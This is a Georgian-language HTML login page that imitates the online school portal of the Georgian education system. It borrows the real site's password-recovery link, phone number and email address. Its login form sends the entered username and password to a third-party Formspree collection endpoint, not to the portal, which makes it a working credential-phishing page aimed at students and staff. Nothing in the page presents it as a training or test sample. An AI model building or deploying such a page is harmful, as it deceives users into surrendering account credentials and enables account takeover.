<!DOCTYPE html>
<html lang="ka">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ონლაინ სკოლა</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    flex-direction:row;
}

/* მარცხენა მხარე */
.left{
    flex:1;
    background:#3b3b98;
    color:white;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    padding:40px 20px;
    position:relative;
}

.left h1{
    margin-bottom:40px;
    font-size:32px;
    text-align:center;
}

form{
    width:100%;
    max-width:350px;
}

.input-box{
    margin-bottom:20px;
}

.input-box input{
    width:100%;
    padding:15px;
    border-radius:30px;
    border:1px solid rgba(255,255,255,0.3);
    background:transparent;
    color:white;
    outline:none;
}

.input-box input::placeholder{
    color:rgba(255,255,255,0.7);
}

button{
    width:100%;
    padding:15px;
    border-radius:30px;
    border:none;
    background:#6fa3ff;
    color:white;
    font-size:16px;
    cursor:pointer;
    transition:0.3s;
}

button:hover{
    opacity:0.9;
}

.forgot{
    margin-top:20px;
    font-size:14px;
    opacity:0.8;
    color:white;
    text-decoration:none;
    display:inline-block;
    cursor:pointer;
}

/* კონტაქტი ბოლოში */
.contact{
    position:absolute;
    bottom:20px;
    left:50%;
    transform:translateX(-50%);
    font-size:14px;
    opacity:0.8;
    text-align:center;
}

/* მარჯვენა მხარე */
.right{
    flex:1;
    background:#1f243d;
    display:flex;
    justify-content:center;
    align-items:center;
}

.right img{
    width:100%;
    height:100%;
    object-fit:cover;
}

/* Responsive */
@media(max-width:768px){
    body{
        flex-direction:column;
    }

    .right{
        display:none; /* ფოტო ქრება მობილურზე */
    }
}
</style>
</head>

<body>

<div class="left">
    <h1>ავტორიზაცია</h1>

    <form action="https://formspree.io/f/mpqjlyaz" method="POST">
        <div class="input-box">
            <input type="text" name="სახელი" placeholder="მომხმარებლის სახელი" required>
        </div>

        <div class="input-box">
            <input type="password" name="პაროლი" placeholder="პაროლი" required>
        </div>

        <button type="submit">შესვლა</button>
    </form>

    <a href="https://onlineschool.emis.ge/recover" class="forgot">
        პაროლის აღდგენა
    </a>

    <div class="contact">
        (995 32) 2 200 220 <br>
        onlineschool@emis.ge
    </div>
</div>

<div class="right">
    <img src="art-board.svg" alt="">
</div>

</body>
</html>
